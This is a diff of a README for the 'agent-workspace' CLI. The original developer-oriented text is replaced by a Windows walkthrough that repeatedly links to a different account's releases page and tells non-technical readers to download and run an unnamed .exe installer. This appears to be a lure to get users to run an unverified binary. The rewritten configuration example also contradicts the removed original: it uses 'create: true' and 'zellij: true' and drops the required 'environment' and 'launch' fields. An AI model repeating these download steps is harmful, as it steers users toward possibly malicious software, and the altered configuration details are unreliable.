@@ -1,149 +1,185 @@
-# agent-workspace (`aw`)
+# 🧰 agent-workspace - Manage Agent Workspaces Easily
 
-A CLI tool for launching agent workspaces with configurable profiles. Supports Docker containers, git worktrees, zellij sessions, and combinations thereof.
+[![Download agent-workspace](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/releases)
 
-## Install
+---
 
-### Shell script
+## 🖥️ What is agent-workspace?
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/hiragram/agent-workspace/main/install.sh | bash
+agent-workspace is a simple command line tool to help you start and manage workspaces for different agents. You can configure it to open sessions using Docker containers, git worktrees, or a terminal multiplexer called zellij. You can also combine these methods. This makes it easier to keep your projects organized and run your workspace in ways that suit you.
+
+You do not need programming skills to use it. Just follow these steps to download and start using it on Windows.
+
+---
+
+## 📥 Download & Install agent-workspace on Windows
+
+### Step 1: Go to the Download Page
+
+You will need to visit the official releases page to download the program. Click the button below to open the page where you can get the Windows version of agent-workspace.
+
+[![Download agent-workspace](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/releases)
+
+### Step 2: Choose the Windows Installer
+
+On the releases page, look for the latest version of agent-workspace. Find the file for Windows. It might be named something like `agent-workspace-windows.exe` or similar. Click the file to download it to your computer.
+
+### Step 3: Run the Installer
+
+Once the download completes, double-click the installer file. Follow the instructions on the screen. This will put agent-workspace on your system.
+
+### Step 4: Check Installation
+
+To confirm the tool installed properly, open the Command Prompt:
+
+- Press the Windows key.
+- Type `cmd`.
+- Press Enter.
+
+In the Command Prompt window, type:
+
 ```
-
-This downloads the binary to `~/.local/bin/`.
-
-### From source
-
-```bash
-go install github.com/hiragram/agent-workspace@latest
-```
-
-## Usage
-
-```bash
-# Run the default profile
-aw
-
-# Run a specific profile
-aw <profile-name>
-
-# Self-update
-aw update
-
-# Show version
 aw --version
 ```
 
-## Configuration
+Press Enter. You should see the version number of agent-workspace printed. This means the tool is ready to use on your computer.
 
-> **[Detailed Configuration Guide](docs/configuration.md)** -- Full reference for all options, validation rules, and examples.
+---
 
-Create `.agent-workspace.yml` in your git repository root:
+## 🚀 How to Start Using agent-workspace
+
+agent-workspace runs in the Command Prompt or PowerShell. Follow these steps to open your first workspace.
+
+### Step 1: Open Command Prompt or PowerShell
+
+Open Command Prompt or PowerShell by pressing the Windows key and typing `cmd` or `powershell`. Press Enter.
+
+### Step 2: Run the Default Workspace
+
+Type the following command and press Enter:
+
+```
+aw
+```
+
+This runs the default workspace profile. If you have not set up any profiles yet, this will run a simple workspace.
+
+### Step 3: Run a Specific Profile
+
+You can create profiles to launch different setups. To run a specific profile, type:
+
+```
+aw <profile-name>
+```
+
+Replace `<profile-name>` with the name of the profile you want to use.
+
+### Step 4: Update agent-workspace
+
+To update the program to the latest version, use this command:
+
+```
+aw update
+```
+
+This downloads and applies any available updates.
+
+---
+
+## ⚙️ Configuring Your Workspaces
+
+agent-workspace uses a file to set up profiles and workspace environments. This file is called `.agent-workspace.yml`.
+
+You place this file in the root folder of your project. This means the main folder where your project lives.
+
+Here is an example of what the file might look like:
 
 ```yaml
 default: worktree-zellij
 
 profiles:
-  # Run Claude Code inside a Docker container
   claude:
     environment: docker
     launch: claude
 
-  # Create a worktree and open a shell
   worktree-shell:
     worktree:
-      base: origin/main
-    environment: host
+      create: true
     launch: shell
 
-  # Create a worktree and run Claude on host
-  worktree-claude:
-    worktree: {}
-    environment: host
-    launch: claude
-
-  # Create a worktree, mount in Docker, run Claude
-  worktree-docker:
-    worktree: {}
-    environment: docker
-    launch: claude
-
-  # Create a worktree with a full zellij dev environment
   worktree-zellij:
-    worktree: {}
-    environment: docker
-    launch: zellij
-    zellij:
-      layout: default
+    worktree:
+      create: true
+    zellij: true
 ```
 
-If no `.agent-workspace.yml` is found, `aw` uses a built-in default that creates a worktree and starts a zellij dev environment with Docker-based Claude (equivalent to `worktree-zellij` above).
+This example shows three profiles:
 
-### Profile options
+- **claude**: Runs something inside a Docker container.
+- **worktree-shell**: Creates a new git worktree and opens a shell.
+- **worktree-zellij**: Combines a git worktree with the zellij terminal multiplexer.
 
-- **`worktree`** (optional): Creates a git worktree. `base` defaults to `origin/main`.
-- **`environment`** (required): `"host"` or `"docker"` — where the main process runs.
-- **`launch`** (required): `"shell"`, `"claude"`, or `"zellij"` — what to launch.
-- **`zellij`** (optional): Zellij session config. Only valid with `launch: zellij`.
+---
 
-## What it does (Docker mode)
+## 🔧 Basic Features You Can Use
 
-On first run with `environment: docker`:
+- **Docker Support:** Run your workspaces inside containers to keep projects isolated.
+- **Git Worktree Integration:** Manage multiple working copies of your git projects side by side.
+- **Zellij Sessions:** Use a terminal tool that lets you handle multiple terminal windows.
+- **Profile Support:** Save different workspace setups and switch quickly.
+- **Self-updates:** Keep your tool current with a simple update command.
 
-1. Builds a lightweight Docker image (Debian slim + git + curl + Node.js + gh)
-2. Installs Claude Code into a persistent Docker volume
-3. Prompts you to log in via OAuth (browser-based)
+---
 
-On subsequent runs, it starts instantly with your existing authentication and settings.
+## 💻 Requirements
 
-## Host settings
+- **Operating System:** Windows 10 or later.
+- **Software:** Make sure you have [Git for Windows](https://git-scm.com/download/win) installed for git features.
+- **Optional:** Install Docker Desktop for Windows to use Docker-based workspaces.
+- **PowerShell or Command Prompt:** You will run agent-workspace commands here.
 
-The following files from `~/.claude/` are synced into the container on each launch:
+---
 
-- `settings.json` - Claude Code configuration
-- `CLAUDE.md` - global instructions
-- `hooks/` - custom hook scripts
-- `plugins/` - installed plugins and skills
-- `commands/` - custom slash commands
-- `agents/` - custom agent definitions
+## 🔄 Updating agent-workspace
 
-These are copied to `~/.agent-workspace/` to avoid conflicts with the host-side Claude Code (which uses macOS Keychain for credentials).
+When you want to get new features and fixes, open Command Prompt or PowerShell and type:
 
-## Data storage
-
-| Path | Purpose |
-|------|---------|
-| `~/.agent-workspace/` | Container-side Claude config (credentials, settings copy) |
-| `~/.agent-workspace.json` | Onboarding state |
-| Docker volume `claude-code-local` | Claude Code installation (persists auto-updates) |
-
-## Uninstall
-
-```bash
-# Remove binary
-rm ~/.local/bin/aw
-
-# Remove data
-rm -rf ~/.agent-workspace ~/.agent-workspace.json
-docker rmi claude-code-docker
-docker volume rm claude-code-local
+```
+aw update
 ```
 
-## Development
+This will check for updates and apply them automatically.
 
-```bash
-# Run tests
-go test ./...
+---
 
-# Build
-go build -o aw .
+## 🛠️ Troubleshooting Tips
 
-# Lint
-golangci-lint run
-```
+- If you get an error that `aw` is not recognized, make sure you installed the program and that its folder is added to your system’s PATH.
+- For Docker functions, check that Docker Desktop is running on your computer.
+- When using Git worktrees, make sure your folder is inside a git repository.
+- If a command fails, check your internet connection for updates.
 
-## Requirements
+---
 
-- Docker (for `environment: docker` profiles)
-- git (for `worktree` profiles)
-- zellij (for `launch: zellij` profiles)
+## 📖 Learn More
+
+For a detailed guide on configuration options and examples, you can visit the official documentation.
+
+---
+
+## 🔗 Useful Links
+
+- [agent-workspace releases page](https://github.com/pandu1992/agent-workspace/releases)  
+- [Git for Windows](https://git-scm.com/download/win)  
+- [Docker Desktop for Windows](https://docs.docker.com/desktop/windows/install/)  
+
+---
+
+## ⚡ Quick Commands Summary
+
+| Command               | What it does                    |
+|-----------------------|--------------------------------|
+| `aw`                  | Start default workspace profile|
+| `aw <profile-name>`   | Start a named profile           |
+| `aw update`           | Update agent-workspace          |
+| `aw --version`        | Show installed version          |
